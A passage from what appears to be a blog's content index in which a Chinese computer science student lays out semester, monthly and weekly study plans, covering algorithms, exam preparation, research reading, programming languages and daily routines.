<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<h2 id="时间安排"><a href="#时间安排" class="headerlink" title="时间安排"></a>时间安排</h2><h3 id="四月"><a href="#四月" class="headerlink" title="四月"></a>四月</h3><ol>
<li>完成计算机网络的学习</li>
<li>完成计算机组成原理的学习</li>
<li>完成英语听力和阅读的提升</li>
<li>科研要开始完全投入了</li>
<li>重新复习一下数据库原理</li>
<li>完成数据库课设</li>
<li>完成算法基础课的学习</li>
</ol>
<h3 id="五月"><a href="#五月" class="headerlink" title="五月"></a>五月</h3><ol>
<li>提前沟通好暑假实习的去处</li>
<li>换一台手机</li>
<li>完成英语写作和翻译能力的提升</li>
<li>可能要去参与项目</li>
<li>准备参加pat</li>
<li>算法提高课完成一半</li>
</ol>
<h3 id="六月"><a href="#六月" class="headerlink" title="六月"></a>六月</h3><ol>
<li>开始英语六级的练习</li>
<li>操作系统</li>
<li>完成算法提高课</li>
<li>准备期末考试</li>
<li>PAT</li>
</ol>
<h3 id="七月"><a href="#七月" class="headerlink" title="七月"></a>七月</h3><ol>
<li>开始考研数学的复习</li>
<li>开始考研英语的研究</li>
<li>进行实习工作</li>
<li>复习考研数据结构</li>
<li></li>
</ol>
<h3 id="八月"><a href="#八月" class="headerlink" title="八月"></a>八月</h3><ol>
<li>编译原理</li>
<li>python</li>
<li>linux</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>寒假学习计划</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h2 id="任务清单"><a href="#任务清单" class="headerlink" title="任务清单"></a>任务清单</h2><h3 id="科研"><a href="#科研" class="headerlink" title="科研"></a>科研</h3><ul>
<li><input disabled="" type="checkbox"> 机器学习的书看完</li>
<li><input checked="" disabled="" type="checkbox"> 学习r语言</li>
<li><input disabled="" type="checkbox"> 学习如何数据可视化</li>
<li><input disabled="" type="checkbox"> 学习一下Python关于科研的api</li>
<li><input disabled="" type="checkbox"> 学习如何用Python写爬虫</li>
</ul>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ul>
<li><input disabled="" type="checkbox"> 至少把代码随想录刷完一遍</li>
<li><input disabled="" type="checkbox"> 包括动态规划</li>
<li><input disabled="" type="checkbox"> 单调栈</li>
<li><input disabled="" type="checkbox"> 树</li>
<li><input disabled="" type="checkbox"> 计算机网络开始学习</li>
<li><input disabled="" type="checkbox"> 操作系统</li>
</ul>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li><input disabled="" type="checkbox"> 数学建模</li>
<li><input checked="" disabled="" type="checkbox"> 离散要不要学习</li>
<li><input checked="" disabled="" type="checkbox"> 不学了浪费时间</li>
<li><input disabled="" type="checkbox"> 专注于学习数学建模</li>
</ul>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ul>
<li><input disabled="" type="checkbox"> 看一下如何抢4级名额的攻略</li>
<li><input disabled="" type="checkbox"> 将考研的单词背完</li>
<li><input disabled="" type="checkbox"> 先进行这个比较简单一点</li>
<li><input disabled="" type="checkbox"> 练一练听力、阅读</li>
<li><input disabled="" type="checkbox"> 作文不用那么着急背，等考前突击</li>
</ul>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ul>
<li><input disabled="" type="checkbox"> MySQL 学完</li>
<li><input disabled="" type="checkbox"> Linux</li>
<li><input disabled="" type="checkbox"> 学习制作脚本</li>
<li><input disabled="" type="checkbox"> 学习制作一个属于自己的博客</li>
<li><input disabled="" type="checkbox"> 重新复习一下前端</li>
<li><input disabled="" type="checkbox"> 还有就是学习项目的制作，比如spritboot</li>
<li><input disabled="" type="checkbox"> 学习一下设计模式</li>
<li><input disabled="" type="checkbox"> C#找个时间学一下</li>
<li><input disabled="" type="checkbox"> unity也可以学习</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li><input disabled="" type="checkbox"> PS</li>
<li><input disabled="" type="checkbox"> 学习制作像素画</li>
<li><input disabled="" type="checkbox"> Word</li>
<li><input disabled="" type="checkbox"> Excel</li>
<li><input disabled="" type="checkbox"> PPT</li>
<li><input disabled="" type="checkbox"> Visio</li>
<li><input disabled="" type="checkbox"> 制作音乐</li>
</ul>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h3><ol>
<li>10:00 左右起床</li>
<li>背单词</li>
</ol>
<h4 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h4><ol>
<li>学习学校课程（12:00 - 13:00）<ol>
<li>或者学一些办公技能<ol>
<li>ppt</li>
<li>excel</li>
<li>ps</li>
</ol>
</li>
</ol>
</li>
<li>练习算法（13:00 - 14:00）</li>
</ol>
<h4 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h4><ol>
<li>学习数学<ol>
<li>学习数学建模</li>
</ol>
</li>
<li>科研<ol>
<li>机器学习</li>
<li>数据可视化</li>
<li>学习python</li>
<li>学习爬虫</li>
<li>看论文</li>
</ol>
</li>
</ol>
<h4 id="晚上"><a href="#晚上" class="headerlink" title="晚上"></a>晚上</h4><ol>
<li>计算机专业知识<ol>
<li>计算机网络</li>
<li>操作系统</li>
</ol>
</li>
<li>编程技能<ol>
<li>MySQL</li>
<li>Linux</li>
</ol>
</li>
</ol>
<h4 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h4><ol>
<li>先规划一下明天的计划</li>
<li>学习英语<ol>
<li>背单词</li>
</ol>
</li>
<li></li>
</ol>
<h2 id="时间规划"><a href="#时间规划" class="headerlink" title="时间规划"></a>时间规划</h2><h4 id="回家之前"><a href="#回家之前" class="headerlink" title="回家之前"></a>回家之前</h4><ol>
<li>完成所有课程作业</li>
<li>列好计划</li>
</ol>
<h4 id="回家——最后一科考完"><a href="#回家——最后一科考完" class="headerlink" title="回家——最后一科考完"></a>回家——最后一科考完</h4><ol>
<li>要把所有的课程作业做完</li>
<li>可以把动态规划刷完</li>
<li>可以把MySQL学完</li>
</ol>
<h4 id="最后一科考完——12月底"><a href="#最后一科考完——12月底" class="headerlink" title="最后一科考完——12月底"></a>最后一科考完——12月底</h4><h4 id="1月——春节"><a href="#1月——春节" class="headerlink" title="1月——春节"></a>1月——春节</h4><h4 id="春节（7天）"><a href="#春节（7天）" class="headerlink" title="春节（7天）"></a>春节（7天）</h4><ol>
<li>可以做一个项目</li>
</ol>
<h4 id="大年初七——开学"><a href="#大年初七——开学" class="headerlink" title="大年初七——开学"></a>大年初七——开学</h4>]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>大三上学期计划</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023/%E5%A4%A7%E4%B8%89%E4%B8%8A%E5%AD%A6%E6%9C%9F%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h2 id="学期总结"><a href="#学期总结" class="headerlink" title="学期总结"></a>学期总结</h2><ol>
<li>下学期英语强四级名额的时候一定要注意是从登入界面进去刷新</li>
<li>下学期一定要去报名软考</li>
<li>不知道这个学期要不要搞竞赛<ol>
<li>但是唯一确定的是我要开始全力的投入到研究上去</li>
</ol>
</li>
<li>要思考一下人际交往<ol>
<li>大学没有永恒的朋友</li>
</ol>
</li>
<li>寒假可能要去公司去做软件开发实习</li>
<li>要把一部分考研内容提前复习了</li>
<li></li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>要完成科研项目的立项</li>
<li>开始进行研究</li>
<li>最好是把那个MIT的线性代数看一下</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>学完acwing的算法提高课</li>
<li>将408全部学完</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>要完成一轮英语四级的训练</li>
<li>考研英语单词的背诵</li>
<li>这个学期英语必须要进行一次考试</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>提前完成数据库的课程设计</li>
<li>要去参加图灵院的项目</li>
<li>设计模式</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>理财</li>
<li>ps</li>
<li>ppt</li>
<li>视频剪辑</li>
<li>写公众号推文</li>
<li>爬虫</li>
</ol>
<h2 id="时间安排"><a href="#时间安排" class="headerlink" title="时间安排"></a>时间安排</h2><h3 id="六月"><a href="#六月" class="headerlink" title="六月"></a>六月</h3><ol>
<li>开始英语六级的练习</li>
<li>操作系统</li>
<li>完成算法提高课</li>
<li>准备期末考试</li>
<li>CFF</li>
</ol>
<h3 id="七月"><a href="#七月" class="headerlink" title="七月"></a>七月</h3><ol>
<li>进行实习工作</li>
<li>操作系统</li>
<li>linux</li>
</ol>
<h3 id="八月"><a href="#八月" class="headerlink" title="八月"></a>八月</h3><ol>
<li>编译原理</li>
<li>C++</li>
</ol>
<h3 id="九月"><a href="#九月" class="headerlink" title="九月"></a>九月</h3><ol>
<li>数学建模比赛</li>
</ol>
<h3 id="十月"><a href="#十月" class="headerlink" title="十月"></a>十月</h3><ol>
<li>图灵院项目C++</li>
<li>小美赛</li>
</ol>
<h3 id="十一月"><a href="#十一月" class="headerlink" title="十一月"></a>十一月</h3><ol>
<li>软考</li>
</ol>
<h3 id="十二月"><a href="#十二月" class="headerlink" title="十二月"></a>十二月</h3><ol>
<li>四六级&#x2F;雅思考试</li>
</ol>
<h3 id="一月"><a href="#一月" class="headerlink" title="一月"></a>一月</h3><ol>
<li>期末考试</li>
<li>准备实习</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>大二下学期计划</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023/%E5%A4%A7%E4%BA%8C%E4%B8%8B%E5%AD%A6%E6%9C%9F%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h2 id="学期总结"><a href="#学期总结" class="headerlink" title="学期总结"></a>学期总结</h2><ol>
<li>下学期英语强四级名额的时候一定要注意是从登入界面进去刷新</li>
<li>下学期一定要去报名软考</li>
<li>不知道这个学期要不要搞竞赛<ol>
<li>但是唯一确定的是我要开始全力的投入到研究上去</li>
</ol>
</li>
<li>要思考一下人际交往<ol>
<li>大学没有永恒的朋友</li>
</ol>
</li>
<li>下学期寒假可能要去公司去做软件开发实习</li>
<li>下学期要把一部分考研内容提前复习了</li>
<li></li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>完成离散数学的课程</li>
<li>这个学期至少要开始确立课题</li>
<li>思考考研数学的复习策略</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>完成计算机网络课程</li>
<li>蓝桥杯</li>
<li>提前学完计算机组成原理</li>
<li>提前学完操作系统</li>
<li>PAT</li>
<li>学完acwing的算法提高课</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>要完成一轮英语四级的训练</li>
<li>考研英语单词的背诵</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>提前完成数据库的课程设计</li>
<li>要去参加图灵院的项目</li>
<li>设计模式</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>理财</li>
<li>ps</li>
<li>ppt</li>
<li>lol</li>
<li>视频剪辑</li>
<li>写公众号推文</li>
<li>爬虫</li>
</ol>
<h2 id="时间安排"><a href="#时间安排" class="headerlink" title="时间安排"></a>时间安排</h2><h3 id="四月"><a href="#四月" class="headerlink" title="四月"></a>四月</h3><ol>
<li>完成计算机网络的学习</li>
<li>完成计算机组成原理的学习</li>
<li>完成英语听力和阅读的提升</li>
<li>科研要开始完全投入了</li>
<li>重新复习一下数据库原理</li>
<li>完成数据库课设</li>
<li>完成算法基础课的学习</li>
</ol>
<h3 id="五月"><a href="#五月" class="headerlink" title="五月"></a>五月</h3><ol>
<li>提前沟通好暑假实习的去处</li>
<li>换一台手机</li>
<li>完成英语写作和翻译能力的提升</li>
<li>可能要去参与项目</li>
<li>准备参加pat</li>
<li>算法提高课完成一半</li>
</ol>
<h3 id="六月"><a href="#六月" class="headerlink" title="六月"></a>六月</h3><ol>
<li>开始英语六级的练习</li>
<li>操作系统</li>
<li>完成算法提高课</li>
<li>准备期末考试</li>
<li>PAT</li>
</ol>
<h3 id="七月"><a href="#七月" class="headerlink" title="七月"></a>七月</h3><ol>
<li>开始考研数学的复习</li>
<li>开始考研英语的研究</li>
<li>进行实习工作</li>
<li>复习考研数据结构</li>
<li></li>
</ol>
<h3 id="八月"><a href="#八月" class="headerlink" title="八月"></a>八月</h3><ol>
<li>编译原理</li>
<li>python</li>
<li>linux</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2022.10.week.1st</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2022.10.week.1st/</url>
    <content><![CDATA[<h1 id="九月第三周计划"><a href="#九月第三周计划" class="headerlink" title="九月第三周计划"></a>九月第三周计划</h1><p>2022.10.10~2022.10.16</p>
<h2 id="上周复盘"><a href="#上周复盘" class="headerlink" title="上周复盘"></a>上周复盘</h2><p>-<br>时间不应该分的太细</p>
<ul>
<li><p>特别是学习时间</p>
</li>
<li><p>会导致学习急于求成，无法精益求精</p>
</li>
<li><p>人生不仅要做“加法”还要做“减法”</p>
<ul>
<li>因为一个的精力始终是有限的</li>
<li>不可能全部出击，要有所选择</li>
<li>想想自己到底要走什么方向，要早做决断</li>
<li>人需要把时间放在性价比最高的事情上去</li>
<li>需要“减”的事件</li>
</ul>
</li>
<li><p>一周的时间里面需要抓住1~2个重要事件</p>
</li>
<li><p>要重新制定新的作息计划</p>
</li>
<li><p>可以看一下B站的未来的规划视频</p>
<ul>
<li>01大学</li>
<li>还有无名之辈</li>
<li>鱼皮</li>
<li>什么时候看</li>
<li>中午吃完饭的时候看一下把</li>
</ul>
</li>
<li><p>还要平衡项目和当前学习的任务</p>
<ul>
<li>当前的学习任务只差一个概率论没有完成</li>
<li></li>
</ul>
</li>
</ul>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><p>1.<br>适应平板的学习方式</p>
<ol>
<li><p>将平板的学习方式融入到正常的学习生活中</p>
</li>
<li><p>准备数学学科比赛</p>
</li>
<li><p>将英语六级的考纲单词背完</p>
</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>看完《为什么》</li>
<li>重新规划学习路线</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ul>
<li><p>每天复习单词</p>
</li>
<li><p>单词背完</p>
</li>
<li><p>规划一下学习路线</p>
</li>
<li><p>用平板将六级考纲单词背完</p>
<ul>
<li>习惯一下用平板背单词的感觉，以便于适应于上课</li>
<li>习惯一下键盘模式、手写笔模式、边背单词边手写模式、全屏模式</li>
</ul>
</li>
</ul>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li><p>只剩下假设试验了</p>
<ul>
<li>抓紧时间看完</li>
<li>这个内容还挺重要的</li>
</ul>
</li>
<li><p>适应一下用平板刷数学题</p>
</li>
</ul>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ul>
<li><p>js学完一些基础的知识</p>
<ul>
<li>能做项目就行了</li>
<li>完成一个贪吃蛇  但是是自定义皮肤</li>
</ul>
</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li><p>写文档</p>
<ol>
<li>MatePad学习笔记软件</li>
<li>设备管理</li>
<li>学习时间</li>
<li>文件管理</li>
<li>购物清单</li>
<li>重新审视一下周计划</li>
<li>重新规划一下时间  把运动时间规划到其中</li>
<li>要重新规划一下英语学习的路线问题</li>
<li>文件如何多端同步</li>
</ol>
</li>
</ol>
<p>- </p>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2022.10.月计划</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2022.10.%E6%9C%88%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h1 id="LearningPlan-October"><a href="#LearningPlan-October" class="headerlink" title="LearningPlan (October)"></a>LearningPlan (October)</h1><h2 id="上月总结"><a href="#上月总结" class="headerlink" title="上月总结"></a>上月总结</h2><ol>
<li><p><strong>要调整一下学习节奏</strong>：</p>
<ul>
<li>应该先完成一项课程，再完成下一项</li>
<li>不要一天之内同时进行太多的学习任务</li>
<li>会把精力分的太多了，多了不精</li>
<li>同时会有一个问题就是，如果一天同时进行多项学习任务，会导致任务的完成时间会被拉长，如果一些事情打断，就会打断学习的连续性</li>
<li>但同时是会有一个问题，就是一个学科学太久了会有大脑疲劳</li>
</ul>
</li>
</ol>
<p>- </p>
<h2 id="本月重点"><a href="#本月重点" class="headerlink" title="本月重点"></a>本月重点</h2><h2 id="Subject-to-Arrange"><a href="#Subject-to-Arrange" class="headerlink" title="Subject to Arrange"></a>Subject to Arrange</h2><h3 id="计算机专业知识"><a href="#计算机专业知识" class="headerlink" title="计算机专业知识"></a>计算机专业知识</h3><ul>
<li><p>计算机网络</p>
</li>
<li><p>还有因果推论</p>
</li>
<li><p>机器学习看完</p>
<ul>
<li>了解大部分算法的原理</li>
</ul>
</li>
</ul>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ul>
<li>把六级词汇完成背诵</li>
<li>还要每天听听力</li>
<li>做往年真题卷做至少3套</li>
<li>有空就做，剩下的暂时不进行</li>
</ul>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li><p>Probability Theory 学完</p>
<ul>
<li>要求掌握大概概念</li>
<li>不要求做题</li>
<li>还有就是要修改笔记</li>
</ul>
</li>
</ul>
<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul>
<li><p>js学完大概</p>
</li>
<li><p>数据库</p>
</li>
<li><p>java复习</p>
<ul>
<li>可能要做一个项目，辅助学习</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2022.11.3rd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2022.11.3rd.WeeklyPlan/</url>
    <content><![CDATA[<p>2022.11.21~2022.11.27</p>
<h2 id="上周复盘"><a href="#上周复盘" class="headerlink" title="上周复盘"></a>上周复盘</h2><ul>
<li><p>要养成一个一个的习惯 </p>
</li>
<li><p>感觉第二天把前一天学习的内容复习一遍，学习效果更好</p>
</li>
<li><p>总结出一个学习经验就是每天要给出明确的任务量 </p>
<ul>
<li>比如一天刷一道有难度的算法题</li>
</ul>
</li>
<li><p>还有就是到底要不要有日总结 </p>
<ul>
<li>要有可以在10:40——11:00 进行书写</li>
<li>要一步步缩短时间，避免浪费太多时间</li>
</ul>
</li>
<li><h2 id="英语的学习还没有起色"><a href="#英语的学习还没有起色" class="headerlink" title="英语的学习还没有起色 "></a>英语的学习还没有起色 </h2></li>
<li><p>一周的时间里面需要抓住1~2个重要事件 </p>
</li>
<li><p>要重新制定新的作息计划</p>
</li>
<li><p>感觉英语单词已经背的很多了，但是还是不会做题</p>
<ul>
<li>应该是不想做题</li>
<li>要养成每天做题的习惯</li>
<li>还是要每天做题</li>
<li>不能在背单词了</li>
</ul>
</li>
<li><p>学习经验</p>
<ul>
<li>学习东西要学习两遍，而且往往是分成两天来学，一天一遍<ul>
<li>比如刷算法题的时候<ul>
<li>第一遍先对着答案理解一下</li>
<li>第二天再根据昨天的记忆不看答案，复现一遍</li>
</ul>
</li>
</ul>
</li>
<li>看书的技巧<ul>
<li>往往要进行三遍，一天只执行一遍</li>
<li>第一遍以段落为单位，看自己可以理解的内容，理解不了的就暂时跳过，先记下来，等后面再来解决，快速看完这个章节</li>
<li>第二遍站在章节的角度，着重解决理解不了的问题，同时整理一下这个章节思路，注意看完一个章节以后一定要进行总结，才能开始阅读下一个章节。</li>
<li>第三遍是在整本书看完以后，站在整本书的角度，着重整理思路，其次记录一下实在解决不了的问题。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>开始研究机器学习</li>
<li>准备新的数学建模比赛</li>
<li>掌握一下新的处理数据的方法</li>
</ol>
<h3 id="科研"><a href="#科研" class="headerlink" title="科研"></a>科研</h3><ol>
<li>看完关于况昆研究的文章</li>
<li>看文况昆稳定学习的论文</li>
<li>争取在这周之内看完《因果学习计量工具》</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>养成每天刷算法题的习惯</li>
<li>刷完贪心算法</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ul>
<li>单词不在继续背了</li>
<li>感觉已经背的差不多了</li>
<li>要养成每天学习英语的习惯</li>
<li>现在就在思考英语单词什么时候背</li>
<li>每天一套阅读</li>
<li>思考如何平衡做题和背单词</li>
</ul>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ol>
<li>概率论完成一轮复习 <ol>
<li>把课后习题的基础题都做过一遍</li>
</ol>
</li>
<li>整理算法库</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ul>
<li><input disabled="" type="checkbox"> 学习MySQL</li>
<li><input disabled="" type="checkbox"> 复习Java</li>
<li>把数学建模会用到的机器学习算法整理一下</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>志愿者</li>
<li>传智杯算法比赛</li>
<li>要开始思考下个月的月计划了</li>
<li>将期末复习的题库导入到软件中</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2022.11.4th.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2022.11.4th.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2022-11-第四周计划"><a href="#2022-11-第四周计划" class="headerlink" title="2022.11.第四周计划"></a>2022.11.第四周计划</h1><p>2022.11.28~2022.12.24</p>
<h2 id="上周复盘"><a href="#上周复盘" class="headerlink" title="上周复盘"></a>上周复盘</h2><ul>
<li><p>要养成一个一个的习惯 </p>
</li>
<li><p>感觉第二天把前一天学习的内容复习一遍，学习效果更好</p>
</li>
<li><p>总结出一个学习经验就是每天要给出明确的任务量 </p>
<ul>
<li>比如一天刷一道有难度的算法题</li>
</ul>
</li>
<li><p>还有就是到底要不要有日总结 </p>
<ul>
<li>要有可以在10:40——11:00 进行书写</li>
<li>要一步步缩短时间，避免浪费太多时间</li>
</ul>
</li>
<li><h2 id="英语的学习还没有起色"><a href="#英语的学习还没有起色" class="headerlink" title="英语的学习还没有起色 "></a>英语的学习还没有起色 </h2></li>
<li><p>一周的时间里面需要抓住1~2个重要事件 </p>
</li>
<li><p>要重新制定新的作息计划</p>
</li>
<li><p>感觉英语单词已经背的很多了，但是还是不会做题</p>
<ul>
<li>应该是不想做题</li>
<li>要养成每天做题的习惯</li>
<li>还是要每天做题</li>
<li>不能在背单词了</li>
</ul>
</li>
<li><p>学习经验</p>
<ul>
<li>学习东西要学习两遍，而且往往是分成两天来学，一天一遍<ul>
<li>比如刷算法题的时候<ul>
<li>第一遍先对着答案理解一下</li>
<li>第二天再根据昨天的记忆不看答案，复现一遍</li>
</ul>
</li>
</ul>
</li>
<li>看书的技巧<ul>
<li>往往要进行三遍，一天只执行一遍</li>
<li>第一遍以段落为单位，看自己可以理解的内容，理解不了的就暂时跳过，先记下来，等后面再来解决，快速看完这个章节</li>
<li>第二遍站在章节的角度，着重解决理解不了的问题，同时整理一下这个章节思路，注意看完一个章节以后一定要进行总结，才能开始阅读下一个章节。</li>
<li>第三遍是在整本书看完以后，站在整本书的角度，着重整理思路，其次记录一下实在解决不了的问题。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>要把概率论结束了</li>
<li>还有算法题也要结束了</li>
<li>准备开始期末复习</li>
<li>这周把可以复习期末考试复习一下</li>
</ol>
<h3 id="科研"><a href="#科研" class="headerlink" title="科研"></a>科研</h3><ol>
<li>争取在这周之内看完《因果学习计量工具》</li>
<li>看完关于况昆研究的文章</li>
<li>看文况昆稳定学习的论文</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>现在每天只留出中午的时间有来刷算法题</li>
<li>现在已经完贪心算法刷完了</li>
<li>尽可能的刷二叉树的题目，刷不完也没有关系</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ul>
<li><input checked="" disabled="" type="checkbox"> 英语单词就暂时先不背了</li>
<li><input disabled="" type="checkbox"> 现在就先专心准备期末考试</li>
</ul>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li><input disabled="" type="checkbox"> 数学建模比赛复盘</li>
<li><input disabled="" type="checkbox"> 整理算法库</li>
<li><input disabled="" type="checkbox"> 把最后剩下的题目刷完</li>
</ul>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ul>
<li><input disabled="" type="checkbox"> 要开始复习java了</li>
<li><input disabled="" type="checkbox"> 复习Java</li>
<li><input disabled="" type="checkbox"> 把数学建模会用到的机器学习算法整理一下</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
<li>准备英语期末考试</li>
<li><input disabled="" type="checkbox"> 背完英语听力选项</li>
<li><input disabled="" type="checkbox"> 背完英语选词的，还有翻译，还有选词组填空</li>
<li>准备政治期末考试</li>
<li><input disabled="" type="checkbox"> 每天一遍非填空题</li>
<li><input disabled="" type="checkbox"> 开始背简答题和论述题</li>
<li><input disabled="" type="checkbox"> 数字逻辑实验报告</li>
</ul>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h3><ul>
<li>专研科研</li>
<li>学习一些数学建模的内容</li>
<li>就是大数据方面的内容</li>
<li>还有查看相关论文</li>
</ul>
<h3 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h3><ul>
<li>刷算法题</li>
</ul>
<h3 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h3><ul>
<li>复习期末考试</li>
<li>学习数学</li>
<li>以及完成各个学科的作业</li>
</ul>
<h3 id="晚上"><a href="#晚上" class="headerlink" title="晚上"></a>晚上</h3><ul>
<li><input disabled="" type="checkbox"> 整理期末复习提纲</li>
</ul>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ul>
<li><input disabled="" type="checkbox"> 列出计划</li>
</ul>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2022.11月计划</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2022.11%E6%9C%88%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h2 id="上月总结"><a href="#上月总结" class="headerlink" title="上月总结"></a>上月总结</h2><ol>
<li><strong>要调整一下学习节奏</strong>：<ul>
<li>应该先完成一项课程，再完成下一项</li>
<li>不要一天之内同时进行太多的学习任务</li>
<li>会把精力分的太多了，多了不精</li>
